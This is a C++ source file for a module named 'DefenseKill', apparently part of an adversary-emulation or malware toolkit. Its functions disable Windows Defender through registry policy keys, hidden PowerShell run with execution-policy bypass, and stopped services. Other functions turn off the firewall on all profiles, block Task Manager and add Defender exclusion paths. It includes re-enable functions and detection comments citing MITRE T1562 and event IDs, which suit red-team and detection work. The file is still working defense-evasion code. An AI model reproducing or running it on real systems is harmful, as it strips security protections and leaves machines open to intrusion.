#include "DefenseKill.h"

// ── Helpers ───────────────────────────────────────────────────────────────────

static bool RegSetDW(HKEY root, const char* keyPath,
                     const char* valName, DWORD val) {
    HKEY hk = NULL;
    if (RegCreateKeyExA(root, keyPath, 0, NULL, REG_OPTION_NON_VOLATILE,
                        KEY_SET_VALUE, NULL, &hk, NULL) != ERROR_SUCCESS) return false;
    bool ok = RegSetValueExA(hk, valName, 0, REG_DWORD,
                              (LPBYTE)&val, sizeof(val)) == ERROR_SUCCESS;
    RegCloseKey(hk);
    return ok;
}

static bool RegDelVal(HKEY root, const char* keyPath, const char* valName) {
    HKEY hk = NULL;
    if (RegOpenKeyExA(root, keyPath, 0, KEY_SET_VALUE, &hk) != ERROR_SUCCESS) return false;
    RegDeleteValueA(hk, valName);
    RegCloseKey(hk);
    return true;
}

static void RunHidden(const std::string& cmd) {
    char windir[MAX_PATH] = {};
    GetWindowsDirectoryA(windir, sizeof(windir)-1);
    std::string ps = std::string(windir) + S("\\System32\\WindowsPowerShell\\v1.0\\powershell.exe");
    std::string args = S("-NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -Command \"") + cmd + S("\"");
    SHELLEXECUTEINFOA sei = {};
    sei.cbSize    = sizeof(sei);
    sei.lpFile    = ps.c_str();
    sei.lpParameters = args.c_str();
    sei.nShow     = SW_HIDE;
    sei.fMask     = SEE_MASK_NOCLOSEPROCESS;
    ShellExecuteExA(&sei);
    if (sei.hProcess) {
        WaitForSingleObject(sei.hProcess, 10000);
        CloseHandle(sei.hProcess);
    }
}

static bool StopService(const char* name) {
    SC_HANDLE hSCM = OpenSCManagerA(NULL, NULL, SC_MANAGER_CONNECT);
    if (!hSCM) return false;
    SC_HANDLE hSvc = OpenServiceA(hSCM, name, SERVICE_STOP | SERVICE_CHANGE_CONFIG);
    bool ok = false;
    if (hSvc) {
        SERVICE_STATUS ss;
        ControlService(hSvc, SERVICE_CONTROL_STOP, &ss);
        // Change start type to Disabled so it doesn't restart
        ChangeServiceConfigA(hSvc, SERVICE_NO_CHANGE, SERVICE_DISABLED,
                              SERVICE_NO_CHANGE, NULL, NULL, NULL,
                              NULL, NULL, NULL, NULL);
        CloseServiceHandle(hSvc);
        ok = true;
    }
    CloseServiceHandle(hSCM);
    return ok;
}

static bool StartService_(const char* name) {
    SC_HANDLE hSCM = OpenSCManagerA(NULL, NULL, SC_MANAGER_CONNECT);
    if (!hSCM) return false;
    SC_HANDLE hSvc = OpenServiceA(hSCM, name, SERVICE_START | SERVICE_CHANGE_CONFIG);
    bool ok = false;
    if (hSvc) {
        ChangeServiceConfigA(hSvc, SERVICE_NO_CHANGE, SERVICE_AUTO_START,
                              SERVICE_NO_CHANGE, NULL, NULL, NULL,
                              NULL, NULL, NULL, NULL);
        StartServiceA(hSvc, 0, NULL);
        CloseServiceHandle(hSvc);
        ok = true;
    }
    CloseServiceHandle(hSCM);
    return ok;
}

// ── Disable Windows Defender ──────────────────────────────────────────────────
// Detection: each method below is an independent detection signal:
//   Registry policy key (HKLM\...\Windows Defender\DisableAntiSpyware) — Sysmon EID 13
//   Set-MpPreference PowerShell cmdlet — Defender logs Security Center event 5007
//   WinDefend service stop — Security log Event 7036
// Together they cover T1562.001 — Impair Defenses: Disable or Modify Tools.

std::string DefenseKill::DisableDefender() {
    std::string r = "DefenseKill: Disable Windows Defender\n";

    // Layer 1: Group Policy registry keys (survive reboots, work even when Tamper Protection off)
    bool reg1 = RegSetDW(HKEY_LOCAL_MACHINE,
        S("SOFTWARE\\Policies\\Microsoft\\Windows Defender").c_str(),
        S("DisableAntiSpyware").c_str(), 1);
    bool reg2 = RegSetDW(HKEY_LOCAL_MACHINE,
        S("SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection").c_str(),
        S("DisableRealtimeMonitoring").c_str(), 1);
    bool reg3 = RegSetDW(HKEY_LOCAL_MACHINE,
        S("SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection").c_str(),
        S("DisableBehaviorMonitoring").c_str(), 1);
    r += "  Registry policy keys: " + std::string((reg1||reg2||reg3)?"OK":"FAILED (need SYSTEM for HKLM)") + "\n";

    // Layer 2: PowerShell Set-MpPreference (works if Tamper Protection is off)
    RunHidden(S("Set-MpPreference -DisableRealtimeMonitoring $true "
                "-DisableBehaviorMonitoring $true "
                "-DisableBlockAtFirstSeen $true "
                "-DisableIOAVProtection $true "
                "-DisableScriptScanning $true "
                "-MAPSReporting 0"));
    r += "  Set-MpPreference: sent (async)\n";

    // Layer 3: Stop and disable WinDefend + WdNisSvc services
    bool s1 = StopService(S("WinDefend").c_str());
    bool s2 = StopService(S("WdNisSvc").c_str());
    r += "  WinDefend stop:  " + std::string(s1?"OK":"FAILED (need SYSTEM or TrustedInstaller)") + "\n";
    r += "  WdNisSvc stop:   " + std::string(s2?"OK":"FAILED") + "\n";

    r += "\nNote: Windows Tamper Protection (if ON) blocks service stop & Set-MpPreference.\n"
         "Registry policy keys still apply and require a Defender update to undo.\n"
         "Detection: Sysmon EID 13 (reg write) + WinDefend EID 7036 (service stop)";
    return r;
}

// ── Re-enable Defender ────────────────────────────────────────────────────────

std::string DefenseKill::EnableDefender() {
    RegDelVal(HKEY_LOCAL_MACHINE,
        S("SOFTWARE\\Policies\\Microsoft\\Windows Defender").c_str(),
        S("DisableAntiSpyware").c_str());
    RegDelVal(HKEY_LOCAL_MACHINE,
        S("SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection").c_str(),
        S("DisableRealtimeMonitoring").c_str());
    RegDelVal(HKEY_LOCAL_MACHINE,
        S("SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection").c_str(),
        S("DisableBehaviorMonitoring").c_str());
    RunHidden(S("Set-MpPreference -DisableRealtimeMonitoring $false "
                "-DisableBehaviorMonitoring $false "
                "-DisableBlockAtFirstSeen $false "
                "-DisableIOAVProtection $false "
                "-DisableScriptScanning $false"));
    StartService_(S("WdNisSvc").c_str());
    StartService_(S("WinDefend").c_str());
    return "DefenseKill: Defender re-enabled (registry + service + Set-MpPreference)";
}

// ── Disable Windows Firewall ───────────────────────────────────────────────────
// Detection: netsh advfirewall command + registry modification = T1562.004.

std::string DefenseKill::DisableFirewall() {
    // Registry approach (all profiles)
    const char* profiles[] = {
        S("SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\StandardProfile").c_str(),
        S("SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\PublicProfile").c_str(),
        S("SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\DomainProfile").c_str(),
    };
    for (auto p : profiles)
        RegSetDW(HKEY_LOCAL_MACHINE, p, S("EnableFirewall").c_str(), 0);

    // netsh command (also fires Windows Security Center event)
    RunHidden(S("netsh advfirewall set allprofiles state off"));

    return "DefenseKill: Firewall disabled (all profiles)\n"
           "Registry EnableFirewall=0 + netsh advfirewall set allprofiles state off\n"
           "Detection: T1562.004 — Sysmon EID 13 (reg) + Security log EID 2003 (netsh)";
}

// ── Re-enable Firewall ─────────────────────────────────────────────────────────

std::string DefenseKill::EnableFirewall() {
    const char* profiles[] = {
        S("SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\StandardProfile").c_str(),
        S("SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\PublicProfile").c_str(),
        S("SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\DomainProfile").c_str(),
    };
    for (auto p : profiles)
        RegSetDW(HKEY_LOCAL_MACHINE, p, S("EnableFirewall").c_str(), 1);
    RunHidden(S("netsh advfirewall set allprofiles state on"));
    return "DefenseKill: Firewall re-enabled (all profiles)";
}

// ── Block Task Manager ────────────────────────────────────────────────────────

std::string DefenseKill::BlockTaskManager(bool block) {
    const char* key = S("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System").c_str();
    if (block) {
        RegSetDW(HKEY_CURRENT_USER, key, S("DisableTaskMgr").c_str(), 1);
        return "DefenseKill: Task Manager blocked (HKCU DisableTaskMgr=1)\n"
               "Detection: T1562.001 — policy key write";
    } else {
        RegDelVal(HKEY_CURRENT_USER, key, S("DisableTaskMgr").c_str());
        return "DefenseKill: Task Manager unblocked";
    }
}

// ── Add Defender exclusion path ────────────────────────────────────────────────

std::string DefenseKill::AddDefenderExclusion(const std::string& path) {
    RunHidden(S("Add-MpPreference -ExclusionPath '") + path + S("'"));
    return "DefenseKill: exclusion added for " + path +
           "\n(Add-MpPreference -ExclusionPath)\n"
           "Detection: T1562.001 — ExclusionPath write, Security Center event 5007";
}
